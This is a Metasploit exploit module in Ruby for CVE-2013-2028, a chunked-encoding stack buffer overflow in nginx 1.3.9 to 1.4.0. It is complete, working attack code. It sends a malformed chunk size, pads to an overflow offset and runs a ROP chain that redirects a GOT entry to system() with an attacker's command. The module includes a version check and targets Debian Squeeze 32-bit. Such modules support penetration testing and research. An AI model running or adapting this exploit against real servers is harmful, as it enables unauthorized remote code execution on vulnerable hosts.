##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
	include Exploit::Remote::Tcp
	include Msf::Exploit::RopDb
	include Msf::Exploit::Brute

	def initialize(info = {})

		super(update_info(info,
			'Name'           => 'Nginx HTTP Server 1.3.9-1.4.0 Chuncked Encoding Stack Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack buffer overflow in versions 1.3.9 to 1.4.0 of nginx. The exploit first triggers
				an integer overflow in the ngx_http_parse_chunked() by supplying an overly long hex value as chunked block size.
				This value is later used when determining the number of bytes to read into a stack buffer, thus the overflow becomes possible.
			},
			'Author'         =>
				[
					'Greg MacManus',    # original discovery
					'hal',              # exploit development
					'saelo'             # exploit development
			],
			'DisclosureDate' => 'May 07 2013',
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					['CVE', '2013-2028'],
					['OSVDB', '93037'],
					['URL', 'http://nginx.org/en/security_advisories.html'],
					['URL', 'http://packetstormsecurity.com/files/121560/Nginx-1.3.9-1.4.0-Stack-Buffer-Overflow.html']
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					#'DisabeNops' => true,
					#'Space'    => 0x800,
					'BadChars' => "\x0d\x0a",
				},
			'Targets'        =>
				[
					[
						'Debian Squeeze 32bit - nginx 1.4.0',
						{
							'Arch' => ARCH_CMD,
							'Platform' => 'unix',
							'Offset' => 5130
						}
					]
				],
			'DefaultTarget' => 0
	))

	register_options([
			OptPort.new('RPORT', [true, "The remote HTTP server port", 80])
		], self.class)

	end

	def store(buf, address, value)
		buf << [0x08050d93].pack("V") # pop edx ; add al 0x83 ; ret
		buf << value
		buf << [0x08067330].pack("V") # pop eax ; ret
		buf << [address].pack("V")
		buf << [0x08070e94].pack("V") # mov [eax] edx ; mov eax 0x0 ; pop ebp ; ret
		buf << [0x41414141].pack("V") # ebp
	end

	def dereference_got

		buf = ""

		# Store the command to execute at .data on nginx
		command = payload.encoded
		i = 0
		while i < command.length
			store(buf, 0x080b4360 + i, command[i, 4].ljust(4, ";"))
			i = i + 4
		end

		# Make a GOT dereference attack to execute system()
		buf << [
			# Put the GOT pointer for localtime_r on ebx
			0x0804ab34,              # pop edi ; pop ebp ; ret
			0x080B4128 - 0x5d5b14c4, # 0x080B4128 => GOT for localtime_r; 0x5d5b14c4 => Adjustment
			0x41414141,              # padding (ebp)
			0x08093c75,              # mov ebx, edi ; dec ecx ; ret
			# Put the offset to system on eax
			0x08067330,              # pop eax # ret
			0xfffb0c80,              # offset => from localtime_r to system; localtime_r 0x00088530; system      0x000391b0
			# Make the magic :-) call to system with controlled argument
			0x08078a46,              # add eax, [ebx+0x5d5b14c4] # ret
			0x0804a3af,              # call eax # system
			0x080b4360               # ptr to .data where contents have been stored
		].pack("V*")

		return buf
	end

	def peer
		"#{rhost}:#{rport}"
	end

	def check

		begin
			res = send_request_fixed(nil)

			if res =~ /^Server: nginx\/(1\.3\.(9|10|11|12|13|14|15|16)|1\.4\.0)/m
				return Exploit::CheckCode::Appears
			elsif res =~ /^Server: nginx/m
				return Exploit::CheckCode::Detected
			end

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			print_error("#{peer} - Connection failed")
		end

		return Exploit::CheckCode::Unknown

	end

	#
	# Generate a random chunk size that will always result
	# in a negative 64bit number when being parsed
	#
	def random_chunk_size(bytes=16)
		return bytes.times.map{ (rand(0x8) + 0x8).to_s(16) }.join
	end

	def send_request_fixed(data)
		connect

		request = 	"GET / HTTP/1.1\r\n"
		request <<	"Host: #{Rex::Text.rand_text_alpha(16)}\r\n"
		request <<	"Transfer-Encoding: Chunked\r\n"
		request <<	"\r\n"
		request <<	"#{data}"

		sock.put(request)

		res = nil

		begin
			res = sock.get_once(-1, 0.5)
		rescue EOFError => e
			# Ignore
		end

		disconnect
		return res

	end

	def exploit()
		print_status("#{peer} - Sending #{payload.encoded.length} byte payload")

		data = 	random_chunk_size(1024)
		data << Rex::Text.pattern_create(target['Offset'] - data.size)
		data << dereference_got

		begin
			send_request_fixed(data)
		rescue Errno::ECONNRESET => e
			# Ignore
		end
		handler
	end

end
